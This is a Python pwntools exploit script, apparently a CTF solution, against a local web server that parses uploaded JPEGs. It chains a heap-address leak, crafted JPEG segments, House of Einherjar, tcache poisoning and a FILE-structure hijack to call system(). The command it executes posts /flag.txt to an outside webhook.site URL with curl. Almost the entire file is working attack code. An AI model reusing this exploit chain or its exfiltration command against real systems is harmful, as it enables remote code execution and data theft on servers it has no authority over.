from pwn import *
import requests
import os
import struct
import subprocess

#context.log_level = "DEBUG"
context.terminal = ["tmux", "new-window"]

url = "http://127.0.0.1:8080/"
curl_url = "localhost:8080"

DHT = 0xC4
COM = 0xFE
SOF =0xc0
SOS =0xDA
SKIP_CLEAR = 0xFD


class jpgpayload:
    def __init__(self):  # SOI start of image
        self.data = bytearray(b"\xff\xd8")

    def add_segment(self, marker: int, content: bytes):
        length = len(content) + 2
        if marker == SKIP_CLEAR:
            length = 0

        self.data.extend(b"\xff" + bytes([marker]))
        self.data.extend(struct.pack(">H", length))
        self.data.extend(content)
        log.info(f" 0xFF{marker:02x} legnth {hex(length)} content {len(content)} bytes")

    def finalize(self):  # end of image
        self.data.extend(b"\xff\xd9")

    def get_bytes(self) -> bytes:
        return bytes(self.data)

    def write_jpg(self):
        with open("./exp.jpg", "wb") as f:
            self.finalize()
            f.write(self.get_bytes())

    def upload(self):
        self.write_jpg()
        os.system(f'curl -F "file=@./exp.jpg" {curl_url}')


def http_header(desc):
    boundary = b"----MyHackerBoundary12345"
    file_content = b"this is the file content"
    body = b"--" + boundary + b"\r\n"
    body += b'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
    body += b"Content-Type: text/plain\r\n"
    body += b"\r\n"
    body += file_content + b"\r\n"
    body += b"--" + boundary + b"--\r\n"

    content_length = len(body)
    headers = b"POST / HTTP/1.1\r\n"
    headers += b"Host: localhost:8080\r\n"
    headers += b"User-Agent: moonkey/1.0\r\n"
    headers += b"Accept: */*\r\n"
    headers += b"Content-Type: text/html; boundary=" + boundary + b"\r\n"
    headers += b"Content-Length: " + str(content_length).encode() + b"\r\n"
    headers += b"Description: " + desc + b"\r\n"

    return headers + b"\r\n" + body


# leak heap
os.system(
    f'touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9.txt && curl -F "file=@./Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9.txt" {curl_url}'
)

response = requests.get(url + "log")

if response.status_code == 200:
    body_bytes = response.content
    heapbase = int(u64(body_bytes[395 : 395 + 6].ljust(8, b"\x00"))) - 0x8D0
    print(f"\nHEAP BASE: {hex(heapbase)}")

# heap exploitation

# fake chunk
fake_chunk = p64(0) + p64(0xAC0 + 0x50 + 0x60 + 0x100)
fake_chunk += p64(heapbase + 0x930) * 4  # fd and bk fill current chunk addresssz

raw_request = http_header(fake_chunk)

host = "localhost"
port = 8080

for i in range(7):
    r = remote(host, port)
    r.send(raw_request)
    response = r.recvall()
    r.close()

jpg = jpgpayload()

comment_size = 0x78
# overlapping chunk
jpg.add_segment(DHT, b"\x00" * 20)  # id 0
jpg.add_segment(COM, b"B" * (comment_size - 8))
jpg.add_segment(DHT, b"\x01" * 20)  # id 1
jpg.add_segment(COM, b"D" * 0x60)  # prevent merge
jpg.add_segment(COM, b"B" * (comment_size - 0x8) + p64(0xAC0 + 0x50 + 0x60 + 0x100))
jpg.add_segment(DHT, b"\x01" * 20)  # overlapping Description chunk b malloc 5 times

# leak libc
jpg.add_segment(COM, b"E" * 0xE0)  # b 7
jpg.add_segment(SKIP_CLEAR, b"skip")
jpg.upload()

response = requests.get(url + "log")
leak = response.content
print(b"\n" + leak)
libcbase = int(u64(leak[825 : 825 + 6].ljust(8, b"\x00"))) - 0x1EA0C0 - 0x30
print("\nlibcbase: " + hex(libcbase))

# arbitrary write
jpg = jpgpayload()

# fake vtable
fake_vtable = flat(
    {
        0xE0: p64((heapbase + 0xE90) + 0x100),  # +0x100=fake_vtable
        0x168: 0,  # fake_vtable+0x68: target address
    },
    filler=b"\0",
)
jpg.add_segment(COM, b"p" * 0x10 + fake_vtable)  #

# house of Einherjar again

fake_chunk_size=0x740+0x500
fake_chunk1 = p64(0) + p64(fake_chunk_size)
fake_chunk1 += (
    p64(heapbase + 0x1b60) * 4
)  # fd and bk fill current chunk addresssz
fake_chunk1 += p64(0xDEADBEEF) * 2

#target_chunk = libcbase + 0x1EA4E0 ^ ((heapbase + 0x20b0) >> 12)
target_chunk = libcbase + 0x1EA5b0 ^ ((heapbase + 0x20b0) >> 12)

fake_tcache = p64(0) + p64(0x101)
fake_tcache += p64(target_chunk) + p64(0)

comment_size = 0xF8
jpg.add_segment(DHT, b"\x00" * 20)  # id 0 b 2
jpg.add_segment(COM, b"\x01" * (0xD0))  # b 3
jpg.add_segment(COM, b"\x01" * (0x350))  # b 4
jpg.add_segment(COM, b"\x01" * (0xA0))  # b 5
jpg.add_segment(COM, fake_chunk1 * 2)  #
jpg.add_segment(DHT, b"\x03" * 20)  #  after house of Einherjar merge malloc
jpg.add_segment(SOF, b"\x00" * (comment_size-0x8))  # victim chunk
jpg.add_segment(DHT, b"\x01" * 20)  # id 1
jpg.add_segment(COM, b"B" * (comment_size - 8))
jpg.add_segment(DHT, b"\x02" * 20)  # id 2
jpg.add_segment(COM, b"D" * 0x20)  # prevent merge
jpg.add_segment(COM, b"B" * (comment_size - 8) + p64(fake_chunk_size)) #b13
jpg.add_segment(DHT, b"\x02" * 20)  # id 2 b14

# tcache attack
jpg.add_segment(SOS,b"a"* 20) #only free
jpg.add_segment(COM, b"\x01" * 0x30 + fake_tcache)#1  # b15
jpg.add_segment(SKIP_CLEAR, b"skip")
jpg.upload()

jpg=jpgpayload()

jpg.add_segment(DHT, b"\x00" * 20)  # id 0 b 2
jpg.add_segment(DHT, b"\x01" * 20)  # id 0 b 2
jpg.add_segment(DHT, b"\x02" * 20)  # id 0 b 2
jpg.upload()

fake_chunk = b"A"*0x10+p64(0)+p64(0xbe1)+p64(libcbase+0x1e9b20)*2+b"a"*0x10+p64(0)+p64(0x31)+b"a"*0x20
fake_chunk += p64(0)+p64(0xb81)+p64(libcbase+0x1ea0f0)*2+p64(heapbase+0x2120)*2

raw_request = http_header(fake_chunk)

r = remote(host, port)
r.send(raw_request)
response = r.recvall()
r.close()

#fsop
# *rdi & 0x8 = 0
# *rdi & 0x800 = 0
# *rdi & 0x2 = 0
#
# *(*(rdi+0xa0) + 0x18) = 0
# *(*(rdi+0xa0) + 0x30) = 0
# *(*(*(rdi+0xa0) + 0xe0) + 0x68) = system
_803 = heapbase + 0x2a0
_804 = heapbase + 0x6a0
system = libcbase + 0x000000000002f2d0
fsop_payload = p64(0) * 2
# fbad2887
fsop_payload += b" sh u*/[" + p64(0) + p64(_803)*6 + p64(_804) + p64(0)*4
fsop_payload += p64(libcbase + 0x1e98e0)
fsop_payload += p64(1) + p64(0xffffffffffffffff)
fsop_payload += p64(libcbase + 0x1ea608) + p64(libcbase + 0x1eb770) #p64(0x000000000a000000) + p64(libcbase + 0x1eb770)
fsop_payload += p64(0xffffffffffffffff) + p64(0)
fsop_payload += p64(libcbase + 0x1ea560) + p64(0) #p64(libcbase + 0x1e97e0) + p64(0)
fsop_payload += p64(system) + p64(libcbase + 0x1ea548)
fsop_payload += p32(0xffffffff) + b"\x00"*20
fsop_payload += p64(libcbase + 0x1e8390 - 0x38) # vtable

#fsop_payload = b"a"*0xff

# script command
file_content = b"curl https://webhook.site/fac199a7-17dc-4941-b460-f6d342636465 -X POST -d \"$(cat /flag.txt)\""

boundary = b"----MyHackerBoundary12345"
body = b"--" + boundary + b"\r\n"
body += b'Content-Disposition: form-data; name="file"; filename="["\r\n'
body += b"Content-Type: text/plain\r\n"
body += b"\r\n"
body += file_content + b"\r\n"
body += b"--" + boundary + b"--\r\n"

content_length = len(body)
headers = b"POST / HTTP/1.1\r\n"
headers += b"Host: localhost:8080\r\n"
headers += b"User-Agent: moonkey/1.0\r\n"
headers += b"Accept: */*\r\n"
headers += b"Content-Type: text/html; boundary=" + boundary + b"\r\n"
headers += b"Content-Length: " + str(content_length).encode() + b"\r\n"
headers += b"Description: " + fsop_payload + b"\r\n"

raw_request = headers + b"\r\n" + body #+ b"a"*46

r = remote(host, port)

#raw_input()
r.send(raw_request)
response = r.recvall()
r.close()

import time
time.sleep(1)
#raw_input()
# trig fsop
os.system(f'curl {curl_url}')
